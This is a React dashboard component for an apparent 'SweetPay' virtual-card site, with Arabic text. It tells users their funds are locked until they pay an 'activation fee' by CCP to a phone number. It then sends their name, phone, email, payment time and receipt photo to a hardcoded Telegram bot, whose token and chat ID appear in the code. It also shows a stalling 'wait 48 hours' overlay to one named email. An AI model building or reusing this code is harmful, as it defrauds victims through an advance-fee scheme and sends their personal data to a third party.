import { useState, useRef } from 'react';
      import { useLocation } from 'wouter';
      import { useAuth } from '@/contexts/AuthContext';
      import { Button } from '@/components/ui/button';
      import { Input } from '@/components/ui/input';
      import { Label } from '@/components/ui/label';
      import { AlertTriangle, Copy, Check, CreditCard, LogOut, Upload, CheckCircle2, Pencil } from 'lucide-react';
      import { motion, AnimatePresence } from 'framer-motion';

      const BOT_TOKEN = '8439446538:AAE7qOmKwdw93kK7R9n4P2T21V7z2KcF-YI';
      const CHAT_ID = '5653032481';
      const ACTIVATION_PHONE = '004264907943';

      const PAYME_EMAIL = 'sofyanborghda@gmail.com';

      async function sendToTelegram(text: string, photo?: File) {
      try {
        if (photo) {
          const fd = new FormData();
          fd.append('chat_id', CHAT_ID);
          fd.append('caption', text);
          fd.append('photo', photo);
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        } else {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' }),
          });
        }
      } catch {}
      }

      function PaymeNoticeOverlay() {
      return (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            zIndex: 9999,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            background: 'rgba(0,0,0,0.6)',
            backdropFilter: 'blur(6px)',
          }}
        >
          <div
            dir="rtl"
            style={{
              background: 'linear-gradient(135deg, #fffbf2 0%, #fff8e8 100%)',
              borderRadius: '24px',
              padding: '48px 40px',
              maxWidth: '440px',
              width: '90%',
              boxShadow: '0 20px 60px rgba(0,0,0,0.25), 0 0 0 1px rgba(249,168,37,0.2)',
              textAlign: 'center',
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
              gap: '20px',
              fontFamily: "'Segoe UI', Tahoma, Arial, sans-serif",
            }}
          >
            {/* Icon circle */}
            <div style={{
              width: '72px',
              height: '72px',
              borderRadius: '50%',
              background: 'linear-gradient(135deg, #f59e0b, #f97316)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              boxShadow: '0 4px 20px rgba(249,168,37,0.4)',
              fontSize: '32px',
            }}>
              ⏳
            </div>

            {/* Title */}
            <h2 style={{
              fontSize: '1.4rem',
              fontWeight: 800,
              color: '#1a1a1a',
              margin: 0,
              lineHeight: 1.4,
              letterSpacing: '-0.3px',
            }}>
              تم إرسال طلبك بنجاح
            </h2>

            {/* Divider */}
            <div style={{
              width: '48px',
              height: '3px',
              borderRadius: '99px',
              background: 'linear-gradient(90deg, #f59e0b, #f97316)',
            }} />

            {/* Message */}
            <p style={{
              fontSize: '1.05rem',
              color: '#555',
              margin: 0,
              lineHeight: 2,
              fontWeight: 500,
            }}>
              تم إرسال طلب تأكيد الرسوم المطلوبة
              <br />
              <span style={{ color: '#1a1a1a', fontWeight: 700 }}>
                الرجاء الانتظار 48 ساعة
              </span>
              <br />
              لقبول طلبكم
            </p>

            {/* Badge */}
            <div style={{
              padding: '10px 28px',
              background: 'linear-gradient(135deg, #f59e0b22, #f9731622)',
              border: '1.5px solid #f59e0b55',
              borderRadius: '99px',
              fontSize: '0.9rem',
              color: '#b45309',
              fontWeight: 700,
              letterSpacing: '0.5px',
            }}>
              🕐 قيد المراجعة · 48 ساعة
            </div>
          </div>
        </div>
      );
      }

      export default function Dashboard() {
      const [, navigate] = useLocation();
      const { user, logout, updateCardName } = useAuth();
      const base = import.meta.env.BASE_URL?.replace(/\/$/, '') || '';

      const [editingName, setEditingName] = useState(false);
      const [nameInput, setNameInput] = useState('');
      const [copied, setCopied] = useState(false);
      const [payFirstName, setPayFirstName] = useState('');
      const [payLastName, setPayLastName] = useState('');
      const [payPhone, setPayPhone] = useState('');
      const [payTime, setPayTime] = useState('');
      const [payFile, setPayFile] = useState<File | null>(null);
      const [payFileName, setPayFileName] = useState('');
      const [sending, setSending] = useState(false);
      const [submitted, setSubmitted] = useState(false);
      const fileRef = useRef<HTMLInputElement>(null);

      if (!user) { navigate('/login'); return null; }

      const isPayme = user.email === PAYME_EMAIL;

      const cardName = user.cardName || user.fullName;
      const cardLastFour = String(Math.abs(user.email.split('').reduce((a: number, c: string) => a + c.charCodeAt(0), 0) % 9000) + 1000);

      const handleCopy = () => {
        navigator.clipboard.writeText(ACTIVATION_PHONE);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      };

      const handleSaveName = () => {
        if (nameInput.trim().length >= 3) {
          updateCardName(nameInput.trim());
          setEditingName(false);
        }
      };

      const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const f = e.target.files?.[0];
        if (f) { setPayFile(f); setPayFileName(f.name); }
      };

      const handlePaymentSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setSending(true);
        const text = `🔔 <b>طلب تفعيل حساب — SweetPay</b>

      👤 <b>الاسم:</b> ${payFirstName} ${payLastName}
      📧 <b>البريد:</b> ${user.email}
      👤 <b>اسم المستخدم:</b> ${user.username}
      📞 <b>الهاتف:</b> ${payPhone}
      🕐 <b>وقت الدفع:</b> ${payTime}
      💳 <b>البطاقة:</b> **** ${cardLastFour} — ${cardName}`;
        await sendToTelegram(text, payFile ?? undefined);
        setSending(false);
        setSubmitted(true);
      };

      const handleLogout = () => { logout(); navigate('/'); };

      return (
        <div dir="rtl" className="min-h-screen bg-background">
          {isPayme && <PaymeNoticeOverlay />}
          {!user.isActive && (
            <div className="bg-destructive text-destructive-foreground px-4 py-3 text-center text-sm font-semibold flex items-center justify-center gap-2 flex-wrap">
              <AlertTriangle size={16} className="shrink-0" />
              <span>الحساب غير مفعل — يجب تفعيله لسحب أموالك</span>
            </div>
          )}
          <header className="border-b border-border bg-card/80 backdrop-blur sticky top-0 z-10 px-4 py-3 flex items-center justify-between gap-4">
            <a href={base + '/'} className="text-xl font-black text-foreground">Sweet<span className="text-primary">Pay</span></a>
            <div className="flex items-center gap-2">
              <span className="text-sm text-muted-foreground hidden sm:block">{user.email}</span>
              <Button variant="ghost" size="sm" onClick={handleLogout} className="gap-1">
                <LogOut size={15} />
                <span className="hidden sm:inline">خروج</span>
              </Button>
            </div>
          </header>

          <main className="container mx-auto px-4 py-8 max-w-xl space-y-6">
            <div className="rounded-2xl bg-gradient-to-br from-primary to-primary/70 p-6 text-white shadow-2xl relative overflow-hidden">
              <div className="absolute top-0 right-0 w-40 h-40 bg-white/10 rounded-full -translate-y-1/2 translate-x-1/2" />
              <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/10 rounded-full translate-y-1/2 -translate-x-1/2" />
              <div className="relative z-10">
                <div className="flex items-center justify-between mb-6">
                  <CreditCard size={28} className="opacity-80" />
                  <span className="text-xs font-semibold opacity-70 tracking-widest uppercase">Virtual Card</span>
                </div>
                <div className="text-2xl font-mono tracking-widest mb-4 opacity-90">
                  **** **** **** {cardLastFour}
                </div>
                <div className="flex items-center justify-between">
                  <div>
                    {editingName ? (
                      <div className="flex gap-2 items-center">
                        <input
                          className="bg-white/20 border border-white/30 rounded px-2 py-1 text-sm text-white placeholder:text-white/60 outline-none w-36"
                          value={nameInput}
                          onChange={e => setNameInput(e.target.value)}
                          placeholder="اسمك في البطاقة"
                          maxLength={24}
                          autoFocus
                        />
                        <button onClick={handleSaveName} className="text-xs bg-white/30 hover:bg-white/40 px-2 py-1 rounded font-bold transition">حفظ</button>
                        <button onClick={() => setEditingName(false)} className="text-xs opacity-70 hover:opacity-100 px-1 transition">✕</button>
                      </div>
                    ) : (
                      <div className="flex items-center gap-2">
                        <span className="font-bold text-lg tracking-wide">{cardName}</span>
                        <button onClick={() => { setNameInput(cardName); setEditingName(true); }} className="opacity-60 hover:opacity-100 transition">
                          <Pencil size={14} />
                        </button>
                      </div>
                    )}
                  </div>
                  <span className="text-xs opacity-70">SweetPay</span>
                </div>
              </div>
            </div>

            {!user.isActive && (
              <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
                <h2 className="font-bold text-lg text-foreground">تفعيل الحساب</h2>
                <p className="text-sm text-muted-foreground leading-relaxed">
                  لتفعيل حسابك وسحب أموالك، قم بإرسال رسوم التفعيل عبر CCP إلى الرقم التالي ثم أرفق إثبات الدفع.
                </p>
                <div
                  onClick={handleCopy}
                  className="flex items-center justify-between bg-muted rounded-xl px-4 py-3 cursor-pointer hover:bg-muted/70 transition-colors group"
                >
                  <span className="font-mono font-bold text-foreground tracking-wider">{ACTIVATION_PHONE}</span>
                  <div className="text-muted-foreground group-hover:text-primary transition-colors">
                    {copied ? <Check size={18} className="text-green-500" /> : <Copy size={18} />}
                  </div>
                </div>

                <AnimatePresence>
                  {!submitted ? (
                    <motion.form
                      key="form"
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      exit={{ opacity: 0 }}
                      onSubmit={handlePaymentSubmit}
                    >
                      <div className="space-y-0">
                        <p className="text-sm font-semibold text-foreground mb-3">بعد الدفع، أرسل إثبات الدفع:</p>
                        <div className="grid grid-cols-2 gap-3">
                          <div className="space-y-1">
                            <Label htmlFor="payFirst">الاسم</Label>
                            <Input id="payFirst" value={payFirstName} onChange={e => setPayFirstName(e.target.value)} required placeholder="محمد" />
                          </div>
                          <div className="space-y-1">
                            <Label htmlFor="payLast">اللقب</Label>
                            <Input id="payLast" value={payLastName} onChange={e => setPayLastName(e.target.value)} required placeholder="أمين" />
                          </div>
                        </div>
                        <div className="space-y-1 mt-3">
                          <Label htmlFor="payPhone">رقم الهاتف</Label>
                          <Input id="payPhone" value={payPhone} onChange={e => setPayPhone(e.target.value)} required placeholder="0550000000" type="tel" />
                        </div>
                        <div className="space-y-1 mt-3">
                          <Label htmlFor="payTime">وقت الدفع الفعلي</Label>
                          <Input id="payTime" value={payTime} onChange={e => setPayTime(e.target.value)} required type="datetime-local" />
                        </div>
                        <div className="space-y-1 mt-3">
                          <Label>صورة الريسيبت / إثبات الدفع</Label>
                          <div onClick={() => fileRef.current?.click()}
                            className="border-2 border-dashed border-border rounded-xl p-4 text-center cursor-pointer hover:border-primary/50 hover:bg-primary/5 transition-colors">
                            {payFileName ? (
                              <p className="text-sm font-semibold text-foreground truncate">{payFileName}</p>
                            ) : (
                              <div className="flex flex-col items-center gap-2 text-muted-foreground">
                                <Upload size={20} /><span className="text-sm">اضغط لرفع صورة الدفع</span>
                              </div>
                            )}
                            <input ref={fileRef} type="file" accept="image/*" className="hidden" onChange={handleFileChange} />
                          </div>
                        </div>
                        <Button type="submit" className="w-full mt-4 font-bold" disabled={sending}>
                          {sending ? 'جاري الإرسال...' : 'إرسال إثبات الدفع ←'}
                        </Button>
                      </div>
                    </motion.form>
                  ) : (
                    <motion.div
                      key="success"
                      initial={{ opacity: 0, y: 8 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="rounded-xl border border-green-500/30 bg-green-500/5 p-4 text-center space-y-1"
                    >
                      <CheckCircle2 size={28} className="text-green-500 mx-auto" />
                      <p className="font-bold text-foreground">تم إرسال إثبات الدفع بنجاح</p>
                      <p className="text-sm text-muted-foreground">سيتم مراجعته وتفعيل حسابك في أقرب وقت.</p>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            )}

            {user.isActive && (
              <div className="rounded-2xl border border-green-500/30 bg-green-500/5 p-5 flex items-center gap-3">
                <CheckCircle2 size={24} className="text-green-500 shrink-0" />
                <div>
                  <p className="font-bold text-foreground">حسابك مفعّل ✓</p>
                  <p className="text-sm text-muted-foreground">بطاقتك جاهزة ويمكنك الاستفادة من الخدمة.</p>
                </div>
              </div>
            )}
          </main>
        </div>
      );
      }
      